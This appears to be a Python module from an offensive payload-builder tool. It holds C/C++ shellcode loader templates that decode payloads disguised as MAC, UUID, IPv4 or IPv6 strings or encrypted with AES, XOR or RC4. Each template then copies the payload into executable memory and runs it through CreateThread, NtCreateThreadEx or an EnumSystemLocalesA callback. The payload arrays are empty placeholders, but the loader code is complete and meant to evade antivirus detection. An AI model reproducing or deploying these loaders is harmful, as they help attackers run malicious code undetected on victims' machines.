
mac_deobfuscation_code = """
#include <Windows.h>
#include <stdio.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
int Error(const char* msg) {
    printf("%s (%u)", msg, GetLastError());
    return 1;
}

int main() {

    const char* MAC[] ={ };
    
    int rowLen = sizeof(MAC) / sizeof(MAC[0]);
    PCSTR Terminator = NULL;
    NTSTATUS STATUS;

    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* alloc_mem = HeapAlloc(hHeap, 0, 0x1000);
    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;

    for (int i = 0; i < rowLen; i++) {
        STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlEthernetStringToAddressA failed in %s result %x (%u)", MAC[i], STATUS, GetLastError());
            return FALSE;
        }
        ptr += 6;
    }

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (!tHandle) {
        printf("Failed to Create the thread (%u)\\n", GetLastError());
        return -3;
    }

    WaitForSingleObject(tHandle, INFINITE);

    printf("alloc_mem\\n", alloc_mem);
    getchar();

    return 0;
}
"""


aes_deobfuscation_code="""
#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")

#pragma comment(lib, "ntdll")

#define NtCurrentProcess()	   ((HANDLE)-1)
#define DEFAULT_BUFLEN 4096

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

EXTERN_C NTSTATUS NtWaitForSingleObject(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);



void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


int main(int argc, char** argv) {

    char AESkey[] =
    unsigned char AESshellcode[] = 
    
    DWORD payload_length = sizeof(AESshellcode);
    
    PVOID BaseAddress = NULL;
    SIZE_T dwSize = 0x2000;

    NTSTATUS status1 = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1)) {
        return 1;
    }

    // Decrypt the AES payload to Original Shellcode
     DecryptAES((char*)AESshellcode, payload_length, AESkey, sizeof(AESkey));


    RtlMoveMemory(BaseAddress, AESshellcode, sizeof(AESshellcode));

    HANDLE hThread;
    DWORD OldProtect = 0;

    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        return 2;
    }

 
    HANDLE hHostThread = INVALID_HANDLE_VALUE;

    NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        printf("[!] Failed in sysNtCreateThreadEx (%u)\\n", GetLastError());
        return 3;
    }

    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;


    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in sysNtWaitForSingleObject (%u)\\n", GetLastError());
        return 4;
    }

    return 0;
}
"""



uuid_deobfuscation_code = """
#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>

#pragma comment(lib, "Rpcrt4.lib")

int main() {
    
    const char* uuids[] =
    {
        // Replace this with the output of generate_uuid_output function
    };

    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* alloc_mem = HeapAlloc(hHeap, 0, 0x1000);
    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;
    int init = sizeof(uuids) / sizeof(uuids[0]);

    for (int i = 0; i < init; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)ptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA != RPC_S_OK\\n");
            CloseHandle(alloc_mem);
            return -1;
        }
        ptr += 16;
    }
    
    EnumSystemLocalesA((LOCALE_ENUMPROCA)alloc_mem, 0);

    return 0;
}
"""


xor_deobfuscation_code = """
#include <iostream>
#include <Windows.h>

int main(int argc, char* argv[])
{
    // Replace the following variables with your XORkey and XORshellcode
    unsigned char XORkey[] = 
    unsigned char XORshellcode[] = 

    int length = sizeof(XORshellcode) / sizeof(XORshellcode[0]);

    void* exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    for (int i = 0; i < length; ++i) {
        XORshellcode[i] ^= XORkey[i % sizeof(XORkey)];
    }

    memcpy(exec, XORshellcode, length);
    ((void(*)())exec)();

    return 0;
}

"""

rc4_deobfuscation_code = """

#include <Windows.h>
#include <stdio.h>

// this is what SystemFunction032 function take as a parameter
typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // the return of SystemFunction032
    NTSTATUS        STATUS = NULL;

    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,
    .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,
.MaximumLength = sPayloadSize };


    // since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

unsigned char Rc4CipherText[] = 


unsigned char Rc4Key[] = 



int main() {
    PBYTE pDeobfuscatedPayload = NULL;
    SIZE_T sDeobfuscatedSize = 0;

    // Printing some information
    printf("[i] Injecting Shellcode into the Local Process of Pid: %d \\n", GetCurrentProcessId());

    printf("[#] Press <Enter> To Decrypt ... ");
    getchar();

    // Decrypting
    printf("[i] Decrypting ...");
    if (!Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText))) {
        return -1;
    }
    printf("[+] DONE !\\n");

    // Assuming that the decrypted data is of the same size as the encrypted data
    sDeobfuscatedSize = sizeof(Rc4CipherText);

    // Allocating memory the size of sDeobfuscatedSize
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \\n", GetLastError());
        return -1;
    }
    // Copying the decrypted payload to the allocated memory
    memcpy(pShellcodeAddress, Rc4CipherText, sDeobfuscatedSize);

    // Setting memory permissions at pShellcodeAddress to be executable
    DWORD dwOldProtection = NULL;
    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \\n", GetLastError());
        return -1;
    }

    // Running the shellcode as a new thread's entry
    printf("[#] Press <Enter> To Run ... ");
    getchar();
    if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \\n", GetLastError());
        return -1;
    }

    // No need to free pDeobfuscatedPayload since it's pointing to Rc4CipherText

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}
"""

ipv6_deobfuscation_code = r"""
#include <Windows.h>
#include <stdio.h>

const char* Ipv6Array[] = {
 // Replace this with the output of generate_ipv6_output function

};


#define NumberOfElements 18

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR                   S,
    PCSTR* Terminator,
    PVOID                   Addr
    );

BOOL Ipv6Deobfuscation(IN const char* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer = NULL;

    SIZE_T          sBuffSize = NULL;

    PCSTR           Terminator = NULL;

    NTSTATUS        STATUS = NULL;

    // getting RtlIpv6StringToAddressA  address from ntdll.dll
    fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
    if (pRtlIpv6StringToAddressA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // getting the real size of the shellcode (number of elements * 16 => original shellcode size)
    sBuffSize = NmbrOfElements * 16;

    // allocating mem, that will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    PBYTE TmpBuffer = pBuffer;

    // loop through all the addresses saved in Ipv6Array
    for (int i = 0; i < NmbrOfElements; i++) {
        // Ipv6Array[i] is a single ipv6 address from the array Ipv6Array
        if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, (PVOID)TmpBuffer)) != 0x0) {
            // if failed ...
            printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
            return FALSE;
        }

        // tmp buffer will be used to point to where to write next (in the newly allocated memory)
        TmpBuffer = TmpBuffer + 16;
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}

int main() {
    PBYTE pDeobfuscatedPayload = NULL;
    SIZE_T sDeobfuscatedSize = NULL;

    // Printing some information
    printf("[i] Injecting Shellcode into the Local Process of Pid: %d \n", GetCurrentProcessId());

    printf("[#] Press <Enter> To Decrypt ... ");
    getchar();

    // Decrypting
    printf("[i] Decrypting ...");
    if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE !\n");

    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %lld \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[#] Press <Enter> To Allocate ... ");
    getchar();

    // Allocating memory the size of sDeobfuscatedSize
    // With memory permissions set to read and write so that we can write the payload later
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    // Copying the payload to the allocated memory
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

    DWORD dwOldProtection = NULL;
    // Setting memory permissions at pShellcodeAddress to be executable
    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    // Running the shellcode as a new thread's entry 
    if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Freeing pDeobfuscatedPayload
    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}
"""

ipv4_deobfuscation_code= r"""
#include <Windows.h>
#include <ntstatus.h>
#include <tchar.h>
#include <stdio.h>

const char* Ipv4Array[] = {
     // Replace this with the output of generate_ipv4_output function

};

#define NumberOfElements 115

typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR                   S,
    BOOLEAN                 Strict,
    PCSTR* Terminator,
    PVOID                   Addr
    );

BOOL Ipv4Deobfuscation(IN const CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
    PBYTE pBuffer = NULL,
        TmpBuffer = NULL;

    SIZE_T sBuffSize = NmbrOfElements * 4;

    PCSTR Terminator = NULL;
    NTSTATUS STATUS = 0;

    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");
    if (pRtlIpv4StringToAddressA == NULL) {
        wprintf(L"[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        wprintf(L"[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    for (SIZE_T i = 0; i < NmbrOfElements; i++) {
        if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
            wprintf(L"[!] RtlIpv4StringToAddressA Failed At [%S] With Error 0x%0.8X\n", Ipv4Array[i], STATUS);
            HeapFree(GetProcessHeap(), 0, pBuffer);
            return FALSE;
        }

        TmpBuffer = (PBYTE)(TmpBuffer + 4);
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}

int wmain() {
    PBYTE pDeobfuscatedPayload = NULL;
    SIZE_T sDeobfuscatedSize = 0;

    wprintf(L"[i] Injecting Shellcode into the Local Process of Pid: %d \n", GetCurrentProcessId());

    wprintf(L"[#] Press <Enter> To Decrypt ... ");
    getchar();

    wprintf(L"[i] Decrypting ...");
    if (!Ipv4Deobfuscation(Ipv4Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    wprintf(L"[+] DONE !\n");

    wprintf(L"[i] Deobfuscated Payload At : 0x%p Of Size : %Iu \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    wprintf(L"[#] Press <Enter> To Allocate ... ");
    getchar();

    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        wprintf(L"[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
        return -1;
    }

    wprintf(L"[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    wprintf(L"[#] Press <Enter> To Write Payload ... ");
    getchar();

    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

    DWORD dwOldProtection = 0;
    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        wprintf(L"[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
        return -1;
    }

    wprintf(L"[#] Press <Enter> To Run ... ");
    getchar();

    if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        wprintf(L"[!] CreateThread Failed With Error : %d \n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);

    wprintf(L"[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}

"""